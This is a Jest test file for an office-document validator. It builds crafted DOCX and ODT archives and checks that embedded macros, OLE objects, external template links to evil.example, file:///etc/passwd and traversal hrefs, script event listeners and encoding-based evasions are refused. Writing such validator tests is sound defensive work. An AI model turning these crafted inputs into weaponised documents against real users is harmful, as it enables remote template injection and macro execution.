/**
 * utils/officeInspect and its worker gate (#1444 slice 7, review round 1).
 * Crafted archives, built with archiver in memory and written to a temp dir.
 */
const fs = require('fs');
const os = require('os');
const path = require('path');
const archiver = require('archiver');

const { inspectOffice, inspectText } = require('../../src/utils/officeInspect');

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'office-inspect-'));
afterAll(() => fs.rmSync(tmp, { recursive: true, force: true }));

let n = 0;
function zipFile(entries) {
  n += 1;
  const file = path.join(tmp, `f${n}.zip`);
  return new Promise((resolve, reject) => {
    const out = fs.createWriteStream(file);
    const archive = archiver('zip');
    out.on('close', () => resolve(file));
    archive.on('error', reject);
    archive.pipe(out);
    for (const [name, content, opts] of entries) archive.append(content, { name, ...(opts || {}) });
    archive.finalize();
  });
}

const CT = `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>`;
const docx = (extra = []) => zipFile([
  ['[Content_Types].xml', CT],
  ['word/document.xml', '<w:document/>'],
  ...extra,
]);
const ODT = 'application/vnd.oasis.opendocument.text';
const odt = (extra = [], content = '<office:document-content/>') => zipFile([
  ['mimetype', ODT, { store: true }],
  ['content.xml', content],
  ...extra,
]);

const code = (p) => p.then(() => 'ok', (e) => e.code);

describe('OOXML embeddings', () => {
  it.each(['x.docm', 'x.xlsm', 'x.docx', 'oleObject1.bin', 'package.zip', 'script'])(
    'refuses word/embeddings/%s', async (leaf) => {
      expect(await code(inspectOffice(await docx([[`word/embeddings/${leaf}`, 'PK']]), 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
    },
  );

  it('refuses one under xl/ and ppt/ too', async () => {
    expect(await code(inspectOffice(await docx([['xl/embeddings/Book1.xlsm', 'x']]), 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
    expect(await code(inspectOffice(await docx([['ppt/embeddings/deck.pptm', 'x']]), 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
  });

  it.each(['image1.png', 'image2.JPG', 'image3.jpeg', 'a.gif', 'b.bmp', 'c.emf', 'd.wmf', 'e.tif', 'f.tiff', 'g.svg'])(
    'allows a picture: %s', async (leaf) => {
      const ext = leaf.slice(leaf.lastIndexOf('.') + 1);
      const types = CT.replace('<Override', `<Default Extension="${ext}" ContentType="image/x-${ext.toLowerCase()}"/><Override`);
      const file = await zipFile([
        ['[Content_Types].xml', types], ['word/document.xml', '<w:document/>'], [`word/embeddings/${leaf}`, 'img'],
      ]);
      expect(await code(inspectOffice(file, 'docx'))).toBe('ok');
    },
  );

  describe('an object behind a picture\'s name', () => {
    const withTypes = (extra, entries) => zipFile([
      ['[Content_Types].xml', CT.replace('<Override', `<Default Extension="png" ContentType="image/png"/>${extra}<Override`)],
      ['word/document.xml', '<w:document/>'],
      ...entries,
    ]);
    const OLE = Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 0, 0]);

    it('refuses a part typed as an OLE object', async () => {
      const file = await withTypes('<Override PartName="/word/embeddings/object1.png" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>',
        [['word/embeddings/object1.png', 'x']]);
      expect(await code(inspectOffice(file, 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
    });

    it('refuses a part with no picture type declared', async () => {
      const file = await zipFile([['[Content_Types].xml', CT], ['word/document.xml', '<w:document/>'], ['word/embeddings/object1.png', 'x']]);
      expect(await code(inspectOffice(file, 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
    });

    it('refuses OLE or zip bytes under a picture type', async () => {
      for (const bytes of [OLE, Buffer.from('PK\x03\x04rest', 'latin1')]) {
        const file = await withTypes('', [['word/embeddings/object1.png', bytes]]);
        expect(await code(inspectOffice(file, 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
      }
    });

    it('refuses an oleObject or package relationship, wherever its target is', async () => {
      for (const type of ['oleObject', 'package', 'control']) {
        const file = await withTypes('', [['word/_rels/document.xml.rels',
          `<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="media/image1.png"/></Relationships>`]]);
        expect(await code(inspectOffice(file, 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
      }
    });

    it('refuses a macro-enabled content type spelled with a character reference', async () => {
      const file = await withTypes('<Default Extension="bin" ContentType="application/vnd.ms-office.vba&#80;roject"/>', []);
      expect(await code(inspectOffice(file, 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
    });
  });
});

describe('OOXML external relationships', () => {
  const rels = (mode) => ['word/_rels/settings.xml.rels',
    `<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode=${mode}/></Relationships>`];

  it.each(['"External"', '\'External\'', '"&#69;xternal"', '"&#x45;xternal"', '"Ext&#101;rnal"', '" External "'])(
    'refuses TargetMode=%s', async (mode) => {
      expect(await code(inspectOffice(await docx([rels(mode)]), 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
    },
  );

  const relsXml = '<?xml version="1.0" encoding="UTF-16"?><Relationships><Relationship Id="r1" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>';
  const utf16be = (text) => {
    const buf = Buffer.from(text, 'utf16le');
    buf.swap16();
    return buf;
  };

  it('reads a UTF-16 part by its byte-order mark, little- or big-endian', async () => {
    const le = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(relsXml, 'utf16le')]);
    const be = Buffer.concat([Buffer.from([0xfe, 0xff]), utf16be(relsXml)]);
    for (const bytes of [le, be]) {
      expect(await code(inspectOffice(await docx([['word/_rels/settings.xml.rels', bytes]]), 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
    }
  });

  it('refuses a part in an encoding the check cannot read', async () => {
    const noBom = Buffer.from(relsXml, 'utf16le');
    const utf7 = '<?xml version="1.0" encoding="UTF-7"?><Relationships/>';
    const utf32 = Buffer.concat([Buffer.from([0xff, 0xfe, 0, 0]), Buffer.from('<a/>', 'utf16le')]);
    for (const bytes of [noBom, utf7, utf32]) {
      expect(await code(inspectOffice(await docx([['word/_rels/settings.xml.rels', bytes]]), 'docx'))).toBe('DOCUMENT_NOT_VALID');
    }
    const odtUtf16 = Buffer.concat([Buffer.from([0xff, 0xfe]),
      Buffer.from('<office:document-content><text:a xlink:href="https://x">x</text:a></office:document-content>', 'utf16le')]);
    expect(await code(inspectOffice(await odt([], odtUtf16), 'odt'))).toBe('DOCUMENT_ACTIVE_CONTENT');
  });

  it('is not fooled by a comment or another value that swallows the real attribute', async () => {
    const tricks = [
      '<Relationships><!-- ignored=" --><Relationship TargetMode="External" Id="r1" Target="https://evil.example/t.dotm"/></Relationships>',
      '<Relationships><Relationship Id="r1" Note="a TargetMode=\'Internal\'" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>',
    ];
    for (const xml of tricks) {
      expect(await code(inspectOffice(await docx([['word/_rels/settings.xml.rels', xml]]), 'docx'))).toBe('DOCUMENT_ACTIVE_CONTENT');
    }
  });

  it('refuses a DTD and malformed XML rather than guessing', async () => {
    const dtd = '<!DOCTYPE r [<!ENTITY e "External">]><Relationships><Relationship Id="r1" Target="x" TargetMode="&e;"/></Relationships>';
    const broken = '<Relationships><Relationship Id="r1" Target="<x" TargetMode="External"/></Relationships>';
    for (const xml of [dtd, broken]) {
      expect(await code(inspectOffice(await docx([['word/_rels/settings.xml.rels', xml]]), 'docx'))).toBe('DOCUMENT_NOT_VALID');
    }
  });

  it('allows internal relationships', async () => {
    expect(await code(inspectOffice(await docx([rels('"Internal"')]), 'docx'))).toBe('ok');
  });
});

describe('ODF', () => {
  it('refuses an embedded sub-document (Object N/)', async () => {
    const file = await odt([['Object 1/content.xml', '<office:document-content/>']]);
    expect(await code(inspectOffice(file, 'odt'))).toBe('DOCUMENT_ACTIVE_CONTENT');
  });

  it.each([
    'https://evil.example/t.ott', 'http://x', 'file:///etc/passwd', 'ftp://x/y', '../../secret.odt',
    '/etc/passwd', '//server/share/x', 'C:\\\\Windows\\\\x',
    '&#104;ttps://evil.example/t.ott', 'https&#x3a;//x', 'vnd.sun.star.script:Lib.Mod.run?language=Basic',
    'macro:///Standard.Module1.Main', 'smb://server/x', './../secret.odt', 'Pictures/%2e%2e/%2e%2e/x',
  ])('refuses an xlink:href to %s in content.xml', async (href) => {
    const content = `<office:document-content><text:a xlink:href="${href}">x</text:a></office:document-content>`;
    expect(await code(inspectOffice(await odt([], content), 'odt'))).toBe('DOCUMENT_ACTIVE_CONTENT');
  });

  it('refuses an href under any prefix bound to xlink', async () => {
    const content = '<office:document-content xmlns:x="http://www.w3.org/1999/xlink"><text:a x:href="https://x">x</text:a></office:document-content>';
    expect(await code(inspectOffice(await odt([], content), 'odt'))).toBe('DOCUMENT_ACTIVE_CONTENT');
  });

  it('refuses a sub-document under any directory name', async () => {
    for (const dir of ['embedded', 'Pictures/doc', 'Obj 1']) {
      const file = await odt([[`${dir}/content.xml`, '<office:document-content/>']],
        `<office:document-content><draw:object xlink:href="./${dir}"/></office:document-content>`);
      expect(await code(inspectOffice(file, 'odt'))).toBe('DOCUMENT_ACTIVE_CONTENT');
    }
  });

  it.each([
    '<draw:frame><draw:object xlink:href="./x"/></draw:frame>',
    '<draw:frame><draw:object-ole xlink:href="./Object 1"/></draw:frame>',
    '<office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" script:macro-name="Standard.Module1.Run"/></office:event-listeners>',
    '<text:p><text:script script:language="javascript">x()</text:script></text:p>',
  ])('refuses an embedding or script element: %s', async (body) => {
    const file = await odt([], `<office:document-content>${body}</office:document-content>`);
    expect(await code(inspectOffice(file, 'odt'))).toBe('DOCUMENT_ACTIVE_CONTENT');
  });

  it('refuses a manifest entry that declares an embedded document', async () => {
    const manifest = '<manifest:manifest><manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/>'
      + '<manifest:file-entry manifest:full-path="Object 9" manifest:media-type="application/vnd.oasis.opendocument.spreadsheet"/></manifest:manifest>';
    const file = await odt([['META-INF/manifest.xml', manifest]]);
    expect(await code(inspectOffice(file, 'odt'))).toBe('DOCUMENT_ACTIVE_CONTENT');
  });

  it('allows what LibreOffice writes into an ordinary document', async () => {
    const content = '<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0">'
      + '<office:scripts/><office:body><office:text><text:p>Hi</text:p></office:text></office:body></office:document-content>';
    const manifest = '<?xml version="1.0" encoding="UTF-8"?><manifest:manifest><manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/>'
      + '<manifest:file-entry manifest:full-path="Configurations2/" manifest:media-type="application/vnd.sun.xml.ui.configuration"/>'
      + '<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>'
      + '<manifest:file-entry manifest:full-path="Thumbnails/thumbnail.png" manifest:media-type="image/png"/></manifest:manifest>';
    const file = await odt([['META-INF/manifest.xml', manifest], ['Thumbnails/thumbnail.png', 'png'], ['meta.xml', '<office:document-meta/>']], content);
    expect(await code(inspectOffice(file, 'odt'))).toBe('ok');
  });

  it('refuses one in styles.xml too', async () => {
    const file = await odt([['styles.xml', '<office:document-styles><draw:image xlink:href=\'https://x/y.png\'/></office:document-styles>']]);
    expect(await code(inspectOffice(file, 'odt'))).toBe('DOCUMENT_ACTIVE_CONTENT');
  });

  it('allows package-internal links', async () => {
    const content = '<office:document-content><draw:image xlink:href="Pictures/a.png"/><text:a xlink:href="#top">x</text:a></office:document-content>';
    expect(await code(inspectOffice(await odt([], content), 'odt'))).toBe('ok');
  });

  it('decides "mimetype first" by the archive order, not by the reader\'s key order', async () => {
    // An entry named "0" sorts first among an object's keys; mimetype is
    // still the first entry in the file, so this is a valid ODF package.
    const valid = await zipFile([['mimetype', ODT, { store: true }], ['0', 'x'], ['content.xml', '<x/>']]);
    expect(await code(inspectOffice(valid, 'odt'))).toBe('ok');
    // And mimetype not first in the file is refused, whatever the keys say.
    const second = await zipFile([['content.xml', '<x/>'], ['mimetype', ODT, { store: true }]]);
    expect(await code(inspectOffice(second, 'odt'))).toBe('DOCUMENT_NOT_VALID');
  });
});

describe('inspectText', () => {
  it('stops reading past the cap', async () => {
    const file = path.join(tmp, 'big.txt');
    fs.writeFileSync(file, 'a'.repeat(300 * 1024));
    expect(await code(inspectText(file, { maxBytes: 100 * 1024 }))).toBe('DOCUMENT_TOO_COMPLEX');
    expect(await code(inspectText(file, { maxBytes: 400 * 1024 }))).toBe('ok');
  });

  it('refuses UTF-8 cut in half at the end, and accepts a multibyte character split across chunks', async () => {
    const cut = path.join(tmp, 'cut.txt');
    fs.writeFileSync(cut, Buffer.from([0x61, 0xc3]));
    expect(await code(inspectText(cut))).toBe('DOCUMENT_NOT_TEXT');
    const split = path.join(tmp, 'split.txt');
    fs.writeFileSync(split, Buffer.concat([Buffer.alloc(64 * 1024 - 1, 0x61), Buffer.from('ä')]));
    expect(await code(inspectText(split))).toBe('ok');
  });
});

describe('officeValidation without a worker', () => {
  it('refuses rather than inspecting in the main thread', async () => {
    jest.resetModules();
    jest.doMock('worker_threads', () => ({ Worker: function NoWorker() { throw new Error('no workers here'); } }));
    const inspect = jest.fn();
    jest.doMock('../../src/utils/officeInspect', () => ({ inspectOffice: inspect }));
    const { validateOffice } = require('../../src/utils/officeValidation');
    const err = await validateOffice(await docx(), 'docx').catch((e) => e);
    expect(err.statusCode).toBe(422);
    expect(err.code).toBe('DOCUMENT_CHECK_UNAVAILABLE');
    expect(inspect).not.toHaveBeenCalled();
    jest.dontMock('worker_threads');
    jest.dontMock('../../src/utils/officeInspect');
  });
});
